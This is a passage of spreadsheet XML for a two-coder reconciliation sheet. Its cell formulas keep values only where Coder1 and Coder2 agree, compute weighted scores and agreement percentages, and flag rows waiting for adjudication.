        <f>IF(AND(Coder1!AD216&amp;""&lt;&gt;"",Coder1!AD216&amp;""=Coder2!AD216&amp;""),Coder1!AD216,"")</f>
        <v/>
      </c>
      <c r="AE216" s="14">
        <f>IF(AND(Coder1!AE216&amp;""&lt;&gt;"",Coder1!AE216&amp;""=Coder2!AE216&amp;""),Coder1!AE216,"")</f>
        <v/>
      </c>
      <c r="AF216" s="14">
        <f>IF(AND(Coder1!AF216&amp;""&lt;&gt;"",Coder1!AF216&amp;""=Coder2!AF216&amp;""),Coder1!AF216,"")</f>
        <v/>
      </c>
      <c r="AG216" s="14">
        <f>IF(AND(Coder1!AG216&amp;""&lt;&gt;"",Coder1!AG216&amp;""=Coder2!AG216&amp;""),Coder1!AG216,"")</f>
        <v/>
      </c>
      <c r="AH216" s="14">
        <f>IF(AND(Coder1!AH216&amp;""&lt;&gt;"",Coder1!AH216&amp;""=Coder2!AH216&amp;""),Coder1!AH216,"")</f>
        <v/>
      </c>
      <c r="AI216" s="11">
        <f>IF(COUNT(E216:L216)=0,"",SUM(E216:L216))</f>
        <v/>
      </c>
      <c r="AJ216" s="11">
        <f>IF(AI216="","",N(E216)*3+N(F216)*2+N(G216)*2+N(H216)*2+N(I216)*2+N(J216)*3+N(K216)*3+N(L216)*3)</f>
        <v/>
      </c>
      <c r="AK216" s="11">
        <f>IF(AI216="","",COUNTIF(N216:AG216,1))</f>
        <v/>
      </c>
      <c r="AL216" s="11">
        <f>IF(OR(AJ216="",AJ216=0),"",ROUND(100*(AJ216-AK216)/AJ216,1))</f>
        <v/>
      </c>
      <c r="AM216" s="11">
        <f>IF(AND(Coder1!AN216=1,Coder2!AN216=1),IF(COUNTBLANK(E216:AH216)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN216" s="11">
        <f>IF(AND(Coder1!AN216=1,Coder2!AN216=1),IF(SUMPRODUCT(--(Coder1!E216:AH216&amp;""&lt;&gt;Coder2!E216:AH216&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO216" s="11" t="n"/>
    </row>
    <row r="217">
      <c r="A217" s="11">
        <f>Coder1!A217</f>
        <v/>
      </c>
      <c r="B217" s="11">
        <f>Coder1!B217</f>
        <v/>
      </c>
      <c r="C217" s="11">
        <f>Coder1!C217</f>
        <v/>
      </c>
      <c r="D217" s="11">
        <f>Coder1!D217</f>
        <v/>
      </c>
      <c r="E217" s="14">
        <f>IF(AND(Coder1!E217&amp;""&lt;&gt;"",Coder1!E217&amp;""=Coder2!E217&amp;""),Coder1!E217,"")</f>
        <v/>
      </c>
      <c r="F217" s="14">
        <f>IF(AND(Coder1!F217&amp;""&lt;&gt;"",Coder1!F217&amp;""=Coder2!F217&amp;""),Coder1!F217,"")</f>
        <v/>
      </c>
      <c r="G217" s="14">
        <f>IF(AND(Coder1!G217&amp;""&lt;&gt;"",Coder1!G217&amp;""=Coder2!G217&amp;""),Coder1!G217,"")</f>
        <v/>
      </c>
      <c r="H217" s="14">
        <f>IF(AND(Coder1!H217&amp;""&lt;&gt;"",Coder1!H217&amp;""=Coder2!H217&amp;""),Coder1!H217,"")</f>
        <v/>
      </c>
      <c r="I217" s="14">
        <f>IF(AND(Coder1!I217&amp;""&lt;&gt;"",Coder1!I217&amp;""=Coder2!I217&amp;""),Coder1!I217,"")</f>
        <v/>
      </c>
      <c r="J217" s="14">
        <f>IF(AND(Coder1!J217&amp;""&lt;&gt;"",Coder1!J217&amp;""=Coder2!J217&amp;""),Coder1!J217,"")</f>
        <v/>
      </c>
      <c r="K217" s="14">
        <f>IF(AND(Coder1!K217&amp;""&lt;&gt;"",Coder1!K217&amp;""=Coder2!K217&amp;""),Coder1!K217,"")</f>
        <v/>
      </c>
      <c r="L217" s="14">
        <f>IF(AND(Coder1!L217&amp;""&lt;&gt;"",Coder1!L217&amp;""=Coder2!L217&amp;""),Coder1!L217,"")</f>
        <v/>
      </c>
      <c r="M217" s="14">
        <f>IF(AND(Coder1!M217&amp;""&lt;&gt;"",Coder1!M217&amp;""=Coder2!M217&amp;""),Coder1!M217,"")</f>
        <v/>
      </c>
      <c r="N217" s="14">
        <f>IF(AND(Coder1!N217&amp;""&lt;&gt;"",Coder1!N217&amp;""=Coder2!N217&amp;""),Coder1!N217,"")</f>
        <v/>
      </c>
      <c r="O217" s="14">
        <f>IF(AND(Coder1!O217&amp;""&lt;&gt;"",Coder1!O217&amp;""=Coder2!O217&amp;""),Coder1!O217,"")</f>
        <v/>
      </c>
      <c r="P217" s="14">
        <f>IF(AND(Coder1!P217&amp;""&lt;&gt;"",Coder1!P217&amp;""=Coder2!P217&amp;""),Coder1!P217,"")</f>
        <v/>
      </c>
      <c r="Q217" s="14">
        <f>IF(AND(Coder1!Q217&amp;""&lt;&gt;"",Coder1!Q217&amp;""=Coder2!Q217&amp;""),Coder1!Q217,"")</f>
        <v/>
      </c>
      <c r="R217" s="14">
        <f>IF(AND(Coder1!R217&amp;""&lt;&gt;"",Coder1!R217&amp;""=Coder2!R217&amp;""),Coder1!R217,"")</f>
        <v/>
      </c>
      <c r="S217" s="14">
        <f>IF(AND(Coder1!S217&amp;""&lt;&gt;"",Coder1!S217&amp;""=Coder2!S217&amp;""),Coder1!S217,"")</f>
        <v/>
      </c>
      <c r="T217" s="14">
        <f>IF(AND(Coder1!T217&amp;""&lt;&gt;"",Coder1!T217&amp;""=Coder2!T217&amp;""),Coder1!T217,"")</f>
        <v/>
      </c>
      <c r="U217" s="14">
        <f>IF(AND(Coder1!U217&amp;""&lt;&gt;"",Coder1!U217&amp;""=Coder2!U217&amp;""),Coder1!U217,"")</f>
        <v/>
      </c>
      <c r="V217" s="14">
        <f>IF(AND(Coder1!V217&amp;""&lt;&gt;"",Coder1!V217&amp;""=Coder2!V217&amp;""),Coder1!V217,"")</f>
        <v/>
      </c>
      <c r="W217" s="14">
        <f>IF(AND(Coder1!W217&amp;""&lt;&gt;"",Coder1!W217&amp;""=Coder2!W217&amp;""),Coder1!W217,"")</f>
        <v/>
      </c>
      <c r="X217" s="14">
        <f>IF(AND(Coder1!X217&amp;""&lt;&gt;"",Coder1!X217&amp;""=Coder2!X217&amp;""),Coder1!X217,"")</f>
        <v/>
      </c>
      <c r="Y217" s="14">
        <f>IF(AND(Coder1!Y217&amp;""&lt;&gt;"",Coder1!Y217&amp;""=Coder2!Y217&amp;""),Coder1!Y217,"")</f>
        <v/>
      </c>
      <c r="Z217" s="14">
        <f>IF(AND(Coder1!Z217&amp;""&lt;&gt;"",Coder1!Z217&amp;""=Coder2!Z217&amp;""),Coder1!Z217,"")</f>
        <v/>
      </c>
      <c r="AA217" s="14">
        <f>IF(AND(Coder1!AA217&amp;""&lt;&gt;"",Coder1!AA217&amp;""=Coder2!AA217&amp;""),Coder1!AA217,"")</f>
        <v/>
      </c>
      <c r="AB217" s="14">
        <f>IF(AND(Coder1!AB217&amp;""&lt;&gt;"",Coder1!AB217&amp;""=Coder2!AB217&amp;""),Coder1!AB217,"")</f>
        <v/>
      </c>
      <c r="AC217" s="14">
        <f>IF(AND(Coder1!AC217&amp;""&lt;&gt;"",Coder1!AC217&amp;""=Coder2!AC217&amp;""),Coder1!AC217,"")</f>
        <v/>
      </c>
      <c r="AD217" s="14">
        <f>IF(AND(Coder1!AD217&amp;""&lt;&gt;"",Coder1!AD217&amp;""=Coder2!AD217&amp;""),Coder1!AD217,"")</f>
        <v/>
      </c>
      <c r="AE217" s="14">
        <f>IF(AND(Coder1!AE217&amp;""&lt;&gt;"",Coder1!AE217&amp;""=Coder2!AE217&amp;""),Coder1!AE217,"")</f>
        <v/>
      </c>
      <c r="AF217" s="14">
        <f>IF(AND(Coder1!AF217&amp;""&lt;&gt;"",Coder1!AF217&amp;""=Coder2!AF217&amp;""),Coder1!AF217,"")</f>
        <v/>
      </c>
      <c r="AG217" s="14">
        <f>IF(AND(Coder1!AG217&amp;""&lt;&gt;"",Coder1!AG217&amp;""=Coder2!AG217&amp;""),Coder1!AG217,"")</f>
        <v/>
      </c>
      <c r="AH217" s="14">
        <f>IF(AND(Coder1!AH217&amp;""&lt;&gt;"",Coder1!AH217&amp;""=Coder2!AH217&amp;""),Coder1!AH217,"")</f>
        <v/>
      </c>
      <c r="AI217" s="11">
        <f>IF(COUNT(E217:L217)=0,"",SUM(E217:L217))</f>
        <v/>
      </c>
      <c r="AJ217" s="11">
        <f>IF(AI217="","",N(E217)*3+N(F217)*2+N(G217)*2+N(H217)*2+N(I217)*2+N(J217)*3+N(K217)*3+N(L217)*3)</f>
        <v/>
      </c>
      <c r="AK217" s="11">
        <f>IF(AI217="","",COUNTIF(N217:AG217,1))</f>
        <v/>
      </c>
      <c r="AL217" s="11">
        <f>IF(OR(AJ217="",AJ217=0),"",ROUND(100*(AJ217-AK217)/AJ217,1))</f>
        <v/>
      </c>
      <c r="AM217" s="11">
        <f>IF(AND(Coder1!AN217=1,Coder2!AN217=1),IF(COUNTBLANK(E217:AH217)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN217" s="11">
        <f>IF(AND(Coder1!AN217=1,Coder2!AN217=1),IF(SUMPRODUCT(--(Coder1!E217:AH217&amp;""&lt;&gt;Coder2!E217:AH217&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO217" s="11" t="n"/>
    </row>
    <row r="218">
      <c r="A218" s="11">
        <f>Coder1!A218</f>
        <v/>
      </c>
      <c r="B218" s="11">
        <f>Coder1!B218</f>
        <v/>
      </c>
      <c r="C218" s="11">
        <f>Coder1!C218</f>
        <v/>
      </c>
      <c r="D218" s="11">
        <f>Coder1!D218</f>
        <v/>
      </c>
      <c r="E218" s="14">
        <f>IF(AND(Coder1!E218&amp;""&lt;&gt;"",Coder1!E218&amp;""=Coder2!E218&amp;""),Coder1!E218,"")</f>
        <v/>
      </c>
      <c r="F218" s="14">
        <f>IF(AND(Coder1!F218&amp;""&lt;&gt;"",Coder1!F218&amp;""=Coder2!F218&amp;""),Coder1!F218,"")</f>
        <v/>
      </c>
      <c r="G218" s="14">
        <f>IF(AND(Coder1!G218&amp;""&lt;&gt;"",Coder1!G218&amp;""=Coder2!G218&amp;""),Coder1!G218,"")</f>
        <v/>
      </c>
      <c r="H218" s="14">
        <f>IF(AND(Coder1!H218&amp;""&lt;&gt;"",Coder1!H218&amp;""=Coder2!H218&amp;""),Coder1!H218,"")</f>
        <v/>
      </c>
      <c r="I218" s="14">
        <f>IF(AND(Coder1!I218&amp;""&lt;&gt;"",Coder1!I218&amp;""=Coder2!I218&amp;""),Coder1!I218,"")</f>
        <v/>
      </c>
      <c r="J218" s="14">
        <f>IF(AND(Coder1!J218&amp;""&lt;&gt;"",Coder1!J218&amp;""=Coder2!J218&amp;""),Coder1!J218,"")</f>
        <v/>
      </c>
      <c r="K218" s="14">
        <f>IF(AND(Coder1!K218&amp;""&lt;&gt;"",Coder1!K218&amp;""=Coder2!K218&amp;""),Coder1!K218,"")</f>
        <v/>
      </c>
      <c r="L218" s="14">
        <f>IF(AND(Coder1!L218&amp;""&lt;&gt;"",Coder1!L218&amp;""=Coder2!L218&amp;""),Coder1!L218,"")</f>
        <v/>
      </c>
      <c r="M218" s="14">
        <f>IF(AND(Coder1!M218&amp;""&lt;&gt;"",Coder1!M218&amp;""=Coder2!M218&amp;""),Coder1!M218,"")</f>
        <v/>
      </c>
      <c r="N218" s="14">
        <f>IF(AND(Coder1!N218&amp;""&lt;&gt;"",Coder1!N218&amp;""=Coder2!N218&amp;""),Coder1!N218,"")</f>
        <v/>
      </c>
      <c r="O218" s="14">
        <f>IF(AND(Coder1!O218&amp;""&lt;&gt;"",Coder1!O218&amp;""=Coder2!O218&amp;""),Coder1!O218,"")</f>
        <v/>
      </c>
      <c r="P218" s="14">
        <f>IF(AND(Coder1!P218&amp;""&lt;&gt;"",Coder1!P218&amp;""=Coder2!P218&amp;""),Coder1!P218,"")</f>
        <v/>
      </c>
      <c r="Q218" s="14">
        <f>IF(AND(Coder1!Q218&amp;""&lt;&gt;"",Coder1!Q218&amp;""=Coder2!Q218&amp;""),Coder1!Q218,"")</f>
        <v/>
      </c>
      <c r="R218" s="14">
        <f>IF(AND(Coder1!R218&amp;""&lt;&gt;"",Coder1!R218&amp;""=Coder2!R218&amp;""),Coder1!R218,"")</f>
        <v/>
      </c>
      <c r="S218" s="14">
        <f>IF(AND(Coder1!S218&amp;""&lt;&gt;"",Coder1!S218&amp;""=Coder2!S218&amp;""),Coder1!S218,"")</f>
        <v/>
      </c>
      <c r="T218" s="14">
        <f>IF(AND(Coder1!T218&amp;""&lt;&gt;"",Coder1!T218&amp;""=Coder2!T218&amp;""),Coder1!T218,"")</f>
        <v/>
      </c>
      <c r="U218" s="14">
        <f>IF(AND(Coder1!U218&amp;""&lt;&gt;"",Coder1!U218&amp;""=Coder2!U218&amp;""),Coder1!U218,"")</f>
        <v/>
      </c>
      <c r="V218" s="14">
        <f>IF(AND(Coder1!V218&amp;""&lt;&gt;"",Coder1!V218&amp;""=Coder2!V218&amp;""),Coder1!V218,"")</f>
        <v/>
      </c>
      <c r="W218" s="14">
        <f>IF(AND(Coder1!W218&amp;""&lt;&gt;"",Coder1!W218&amp;""=Coder2!W218&amp;""),Coder1!W218,"")</f>
        <v/>
      </c>
      <c r="X218" s="14">
        <f>IF(AND(Coder1!X218&amp;""&lt;&gt;"",Coder1!X218&amp;""=Coder2!X218&amp;""),Coder1!X218,"")</f>
        <v/>
      </c>
      <c r="Y218" s="14">
        <f>IF(AND(Coder1!Y218&amp;""&lt;&gt;"",Coder1!Y218&amp;""=Coder2!Y218&amp;""),Coder1!Y218,"")</f>
        <v/>
      </c>
      <c r="Z218" s="14">
        <f>IF(AND(Coder1!Z218&amp;""&lt;&gt;"",Coder1!Z218&amp;""=Coder2!Z218&amp;""),Coder1!Z218,"")</f>
        <v/>
      </c>
      <c r="AA218" s="14">
        <f>IF(AND(Coder1!AA218&amp;""&lt;&gt;"",Coder1!AA218&amp;""=Coder2!AA218&amp;""),Coder1!AA218,"")</f>
        <v/>
      </c>
      <c r="AB218" s="14">
        <f>IF(AND(Coder1!AB218&amp;""&lt;&gt;"",Coder1!AB218&amp;""=Coder2!AB218&amp;""),Coder1!AB218,"")</f>
        <v/>
      </c>
      <c r="AC218" s="14">
        <f>IF(AND(Coder1!AC218&amp;""&lt;&gt;"",Coder1!AC218&amp;""=Coder2!AC218&amp;""),Coder1!AC218,"")</f>
        <v/>
      </c>
      <c r="AD218" s="14">
        <f>IF(AND(Coder1!AD218&amp;""&lt;&gt;"",Coder1!AD218&amp;""=Coder2!AD218&amp;""),Coder1!AD218,"")</f>
        <v/>
      </c>
      <c r="AE218" s="14">
        <f>IF(AND(Coder1!AE218&amp;""&lt;&gt;"",Coder1!AE218&amp;""=Coder2!AE218&amp;""),Coder1!AE218,"")</f>
        <v/>
      </c>
      <c r="AF218" s="14">
        <f>IF(AND(Coder1!AF218&amp;""&lt;&gt;"",Coder1!AF218&amp;""=Coder2!AF218&amp;""),Coder1!AF218,"")</f>
        <v/>
      </c>
      <c r="AG218" s="14">
        <f>IF(AND(Coder1!AG218&amp;""&lt;&gt;"",Coder1!AG218&amp;""=Coder2!AG218&amp;""),Coder1!AG218,"")</f>
        <v/>
      </c>
      <c r="AH218" s="14">
        <f>IF(AND(Coder1!AH218&amp;""&lt;&gt;"",Coder1!AH218&amp;""=Coder2!AH218&amp;""),Coder1!AH218,"")</f>
        <v/>
      </c>
      <c r="AI218" s="11">
        <f>IF(COUNT(E218:L218)=0,"",SUM(E218:L218))</f>
        <v/>
      </c>
      <c r="AJ218" s="11">
        <f>IF(AI218="","",N(E218)*3+N(F218)*2+N(G218)*2+N(H218)*2+N(I218)*2+N(J218)*3+N(K218)*3+N(L218)*3)</f>
        <v/>
      </c>
      <c r="AK218" s="11">
        <f>IF(AI218="","",COUNTIF(N218:AG218,1))</f>
        <v/>
      </c>
      <c r="AL218" s="11">
        <f>IF(OR(AJ218="",AJ218=0),"",ROUND(100*(AJ218-AK218)/AJ218,1))</f>
        <v/>
      </c>
      <c r="AM218" s="11">
        <f>IF(AND(Coder1!AN218=1,Coder2!AN218=1),IF(COUNTBLANK(E218:AH218)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN218" s="11">
        <f>IF(AND(Coder1!AN218=1,Coder2!AN218=1),IF(SUMPRODUCT(--(Coder1!E218:AH218&amp;""&lt;&gt;Coder2!E218:AH218&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO218" s="11" t="n"/>
    </row>
    <row r="219">
      <c r="A219" s="11">
        <f>Coder1!A219</f>
        <v/>
      </c>
      <c r="B219" s="11">
        <f>Coder1!B219</f>
        <v/>
      </c>
      <c r="C219" s="11">
        <f>Coder1!C219</f>
        <v/>
      </c>
      <c r="D219" s="11">
        <f>Coder1!D219</f>
        <v/>
      </c>
      <c r="E219" s="14">
        <f>IF(AND(Coder1!E219&amp;""&lt;&gt;"",Coder1!E219&amp;""=Coder2!E219&amp;""),Coder1!E219,"")</f>
        <v/>
      </c>
      <c r="F219" s="14">
        <f>IF(AND(Coder1!F219&amp;""&lt;&gt;"",Coder1!F219&amp;""=Coder2!F219&amp;""),Coder1!F219,"")</f>
        <v/>
      </c>
      <c r="G219" s="14">
        <f>IF(AND(Coder1!G219&amp;""&lt;&gt;"",Coder1!G219&amp;""=Coder2!G219&amp;""),Coder1!G219,"")</f>
        <v/>
      </c>
      <c r="H219" s="14">
        <f>IF(AND(Coder1!H219&amp;""&lt;&gt;"",Coder1!H219&amp;""=Coder2!H219&amp;""),Coder1!H219,"")</f>
        <v/>
      </c>
      <c r="I219" s="14">
        <f>IF(AND(Coder1!I219&amp;""&lt;&gt;"",Coder1!I219&amp;""=Coder2!I219&amp;""),Coder1!I219,"")</f>
        <v/>
      </c>
      <c r="J219" s="14">
        <f>IF(AND(Coder1!J219&amp;""&lt;&gt;"",Coder1!J219&amp;""=Coder2!J219&amp;""),Coder1!J219,"")</f>
        <v/>
      </c>
      <c r="K219" s="14">
        <f>IF(AND(Coder1!K219&amp;""&lt;&gt;"",Coder1!K219&amp;""=Coder2!K219&amp;""),Coder1!K219,"")</f>
        <v/>
      </c>
      <c r="L219" s="14">
        <f>IF(AND(Coder1!L219&amp;""&lt;&gt;"",Coder1!L219&amp;""=Coder2!L219&amp;""),Coder1!L219,"")</f>
        <v/>
      </c>
      <c r="M219" s="14">
        <f>IF(AND(Coder1!M219&amp;""&lt;&gt;"",Coder1!M219&amp;""=Coder2!M219&amp;""),Coder1!M219,"")</f>
        <v/>
      </c>
      <c r="N219" s="14">
        <f>IF(AND(Coder1!N219&amp;""&lt;&gt;"",Coder1!N219&amp;""=Coder2!N219&amp;""),Coder1!N219,"")</f>
        <v/>
      </c>
      <c r="O219" s="14">
        <f>IF(AND(Coder1!O219&amp;""&lt;&gt;"",Coder1!O219&amp;""=Coder2!O219&amp;""),Coder1!O219,"")</f>
        <v/>
      </c>
      <c r="P219" s="14">
        <f>IF(AND(Coder1!P219&amp;""&lt;&gt;"",Coder1!P219&amp;""=Coder2!P219&amp;""),Coder1!P219,"")</f>
        <v/>
      </c>
      <c r="Q219" s="14">
        <f>IF(AND(Coder1!Q219&amp;""&lt;&gt;"",Coder1!Q219&amp;""=Coder2!Q219&amp;""),Coder1!Q219,"")</f>
        <v/>
      </c>
      <c r="R219" s="14">
        <f>IF(AND(Coder1!R219&amp;""&lt;&gt;"",Coder1!R219&amp;""=Coder2!R219&amp;""),Coder1!R219,"")</f>
        <v/>
      </c>
      <c r="S219" s="14">
        <f>IF(AND(Coder1!S219&amp;""&lt;&gt;"",Coder1!S219&amp;""=Coder2!S219&amp;""),Coder1!S219,"")</f>
        <v/>
      </c>
      <c r="T219" s="14">
        <f>IF(AND(Coder1!T219&amp;""&lt;&gt;"",Coder1!T219&amp;""=Coder2!T219&amp;""),Coder1!T219,"")</f>
        <v/>
      </c>
      <c r="U219" s="14">
        <f>IF(AND(Coder1!U219&amp;""&lt;&gt;"",Coder1!U219&amp;""=Coder2!U219&amp;""),Coder1!U219,"")</f>
        <v/>
      </c>
      <c r="V219" s="14">
        <f>IF(AND(Coder1!V219&amp;""&lt;&gt;"",Coder1!V219&amp;""=Coder2!V219&amp;""),Coder1!V219,"")</f>
        <v/>
      </c>
      <c r="W219" s="14">
        <f>IF(AND(Coder1!W219&amp;""&lt;&gt;"",Coder1!W219&amp;""=Coder2!W219&amp;""),Coder1!W219,"")</f>
        <v/>
      </c>
      <c r="X219" s="14">
        <f>IF(AND(Coder1!X219&amp;""&lt;&gt;"",Coder1!X219&amp;""=Coder2!X219&amp;""),Coder1!X219,"")</f>
        <v/>
      </c>
      <c r="Y219" s="14">
        <f>IF(AND(Coder1!Y219&amp;""&lt;&gt;"",Coder1!Y219&amp;""=Coder2!Y219&amp;""),Coder1!Y219,"")</f>
        <v/>
      </c>
      <c r="Z219" s="14">
        <f>IF(AND(Coder1!Z219&amp;""&lt;&gt;"",Coder1!Z219&amp;""=Coder2!Z219&amp;""),Coder1!Z219,"")</f>
        <v/>
      </c>
      <c r="AA219" s="14">
        <f>IF(AND(Coder1!AA219&amp;""&lt;&gt;"",Coder1!AA219&amp;""=Coder2!AA219&amp;""),Coder1!AA219,"")</f>
        <v/>
      </c>
      <c r="AB219" s="14">
        <f>IF(AND(Coder1!AB219&amp;""&lt;&gt;"",Coder1!AB219&amp;""=Coder2!AB219&amp;""),Coder1!AB219,"")</f>
        <v/>
      </c>
      <c r="AC219" s="14">
        <f>IF(AND(Coder1!AC219&amp;""&lt;&gt;"",Coder1!AC219&amp;""=Coder2!AC219&amp;""),Coder1!AC219,"")</f>
        <v/>
      </c>
      <c r="AD219" s="14">
        <f>IF(AND(Coder1!AD219&amp;""&lt;&gt;"",Coder1!AD219&amp;""=Coder2!AD219&amp;""),Coder1!AD219,"")</f>
        <v/>
      </c>
      <c r="AE219" s="14">
        <f>IF(AND(Coder1!AE219&amp;""&lt;&gt;"",Coder1!AE219&amp;""=Coder2!AE219&amp;""),Coder1!AE219,"")</f>
        <v/>
      </c>
      <c r="AF219" s="14">
        <f>IF(AND(Coder1!AF219&amp;""&lt;&gt;"",Coder1!AF219&amp;""=Coder2!AF219&amp;""),Coder1!AF219,"")</f>
        <v/>
      </c>
      <c r="AG219" s="14">
        <f>IF(AND(Coder1!AG219&amp;""&lt;&gt;"",Coder1!AG219&amp;""=Coder2!AG219&amp;""),Coder1!AG219,"")</f>
        <v/>
      </c>
      <c r="AH219" s="14">
        <f>IF(AND(Coder1!AH219&amp;""&lt;&gt;"",Coder1!AH219&amp;""=Coder2!AH219&amp;""),Coder1!AH219,"")</f>
        <v/>
      </c>
      <c r="AI219" s="11">
        <f>IF(COUNT(E219:L219)=0,"",SUM(E219:L219))</f>
        <v/>
      </c>
      <c r="AJ219" s="11">
        <f>IF(AI219="","",N(E219)*3+N(F219)*2+N(G219)*2+N(H219)*2+N(I219)*2+N(J219)*3+N(K219)*3+N(L219)*3)</f>
        <v/>
      </c>
      <c r="AK219" s="11">
        <f>IF(AI219="","",COUNTIF(N219:AG219,1))</f>
        <v/>
      </c>
      <c r="AL219" s="11">
        <f>IF(OR(AJ219="",AJ219=0),"",ROUND(100*(AJ219-AK219)/AJ219,1))</f>
        <v/>
      </c>
      <c r="AM219" s="11">
        <f>IF(AND(Coder1!AN219=1,Coder2!AN219=1),IF(COUNTBLANK(E219:AH219)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN219" s="11">
        <f>IF(AND(Coder1!AN219=1,Coder2!AN219=1),IF(SUMPRODUCT(--(Coder1!E219:AH219&amp;""&lt;&gt;Coder2!E219:AH219&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO219" s="11" t="n"/>
    </row>
    <row r="220">
      <c r="A220" s="11">
        <f>Coder1!A220</f>
        <v/>
      </c>
      <c r="B220" s="11">
        <f>Coder1!B220</f>
        <v/>
      </c>
      <c r="C220" s="11">
        <f>Coder1!C220</f>
        <v/>
      </c>
      <c r="D220" s="11">
        <f>Coder1!D220</f>
        <v/>
      </c>
      <c r="E220" s="14">
        <f>IF(AND(Coder1!E220&amp;""&lt;&gt;"",Coder1!E220&amp;""=Coder2!E220&amp;""),Coder1!E220,"")</f>
        <v/>
      </c>
      <c r="F220" s="14">
        <f>IF(AND(Coder1!F220&amp;""&lt;&gt;"",Coder1!F220&amp;""=Coder2!F220&amp;""),Coder1!F220,"")</f>
        <v/>
      </c>
      <c r="G220" s="14">
        <f>IF(AND(Coder1!G220&amp;""&lt;&gt;"",Coder1!G220&amp;""=Coder2!G220&amp;""),Coder1!G220,"")</f>
        <v/>
      </c>
      <c r="H220" s="14">
        <f>IF(AND(Coder1!H220&amp;""&lt;&gt;"",Coder1!H220&amp;""=Coder2!H220&amp;""),Coder1!H220,"")</f>
        <v/>
      </c>
      <c r="I220" s="14">
        <f>IF(AND(Coder1!I220&amp;""&lt;&gt;"",Coder1!I220&amp;""=Coder2!I220&amp;""),Coder1!I220,"")</f>
        <v/>
      </c>
      <c r="J220" s="14">
        <f>IF(AND(Coder1!J220&amp;""&lt;&gt;"",Coder1!J220&amp;""=Coder2!J220&amp;""),Coder1!J220,"")</f>
        <v/>
      </c>
      <c r="K220" s="14">
        <f>IF(AND(Coder1!K220&amp;""&lt;&gt;"",Coder1!K220&amp;""=Coder2!K220&amp;""),Coder1!K220,"")</f>
        <v/>
      </c>
      <c r="L220" s="14">
        <f>IF(AND(Coder1!L220&amp;""&lt;&gt;"",Coder1!L220&amp;""=Coder2!L220&amp;""),Coder1!L220,"")</f>
        <v/>
      </c>
      <c r="M220" s="14">
        <f>IF(AND(Coder1!M220&amp;""&lt;&gt;"",Coder1!M220&amp;""=Coder2!M220&amp;""),Coder1!M220,"")</f>
        <v/>
      </c>
      <c r="N220" s="14">
        <f>IF(AND(Coder1!N220&amp;""&lt;&gt;"",Coder1!N220&amp;""=Coder2!N220&amp;""),Coder1!N220,"")</f>
        <v/>
      </c>
      <c r="O220" s="14">
        <f>IF(AND(Coder1!O220&amp;""&lt;&gt;"",Coder1!O220&amp;""=Coder2!O220&amp;""),Coder1!O220,"")</f>
        <v/>
      </c>
      <c r="P220" s="14">
        <f>IF(AND(Coder1!P220&amp;""&lt;&gt;"",Coder1!P220&amp;""=Coder2!P220&amp;""),Coder1!P220,"")</f>
        <v/>
      </c>
      <c r="Q220" s="14">
        <f>IF(AND(Coder1!Q220&amp;""&lt;&gt;"",Coder1!Q220&amp;""=Coder2!Q220&amp;""),Coder1!Q220,"")</f>
        <v/>
      </c>
      <c r="R220" s="14">
        <f>IF(AND(Coder1!R220&amp;""&lt;&gt;"",Coder1!R220&amp;""=Coder2!R220&amp;""),Coder1!R220,"")</f>
        <v/>
      </c>
      <c r="S220" s="14">
        <f>IF(AND(Coder1!S220&amp;""&lt;&gt;"",Coder1!S220&amp;""=Coder2!S220&amp;""),Coder1!S220,"")</f>
        <v/>
      </c>
      <c r="T220" s="14">
        <f>IF(AND(Coder1!T220&amp;""&lt;&gt;"",Coder1!T220&amp;""=Coder2!T220&amp;""),Coder1!T220,"")</f>
        <v/>
      </c>
      <c r="U220" s="14">
        <f>IF(AND(Coder1!U220&amp;""&lt;&gt;"",Coder1!U220&amp;""=Coder2!U220&amp;""),Coder1!U220,"")</f>
        <v/>
      </c>
      <c r="V220" s="14">
        <f>IF(AND(Coder1!V220&amp;""&lt;&gt;"",Coder1!V220&amp;""=Coder2!V220&amp;""),Coder1!V220,"")</f>
        <v/>
      </c>
      <c r="W220" s="14">
        <f>IF(AND(Coder1!W220&amp;""&lt;&gt;"",Coder1!W220&amp;""=Coder2!W220&amp;""),Coder1!W220,"")</f>
        <v/>
      </c>
      <c r="X220" s="14">
        <f>IF(AND(Coder1!X220&amp;""&lt;&gt;"",Coder1!X220&amp;""=Coder2!X220&amp;""),Coder1!X220,"")</f>
        <v/>
      </c>
      <c r="Y220" s="14">
        <f>IF(AND(Coder1!Y220&amp;""&lt;&gt;"",Coder1!Y220&amp;""=Coder2!Y220&amp;""),Coder1!Y220,"")</f>
        <v/>
      </c>
      <c r="Z220" s="14">
        <f>IF(AND(Coder1!Z220&amp;""&lt;&gt;"",Coder1!Z220&amp;""=Coder2!Z220&amp;""),Coder1!Z220,"")</f>
        <v/>
      </c>
      <c r="AA220" s="14">
        <f>IF(AND(Coder1!AA220&amp;""&lt;&gt;"",Coder1!AA220&amp;""=Coder2!AA220&amp;""),Coder1!AA220,"")</f>
        <v/>
      </c>
      <c r="AB220" s="14">
        <f>IF(AND(Coder1!AB220&amp;""&lt;&gt;"",Coder1!AB220&amp;""=Coder2!AB220&amp;""),Coder1!AB220,"")</f>
        <v/>
      </c>
      <c r="AC220" s="14">
        <f>IF(AND(Coder1!AC220&amp;""&lt;&gt;"",Coder1!AC220&amp;""=Coder2!AC220&amp;""),Coder1!AC220,"")</f>
        <v/>
      </c>
      <c r="AD220" s="14">
        <f>IF(AND(Coder1!AD220&amp;""&lt;&gt;"",Coder1!AD220&amp;""=Coder2!AD220&amp;""),Coder1!AD220,"")</f>
        <v/>
      </c>
      <c r="AE220" s="14">
        <f>IF(AND(Coder1!AE220&amp;""&lt;&gt;"",Coder1!AE220&amp;""=Coder2!AE220&amp;""),Coder1!AE220,"")</f>
        <v/>
      </c>
      <c r="AF220" s="14">
        <f>IF(AND(Coder1!AF220&amp;""&lt;&gt;"",Coder1!AF220&amp;""=Coder2!AF220&amp;""),Coder1!AF220,"")</f>
        <v/>
      </c>
      <c r="AG220" s="14">
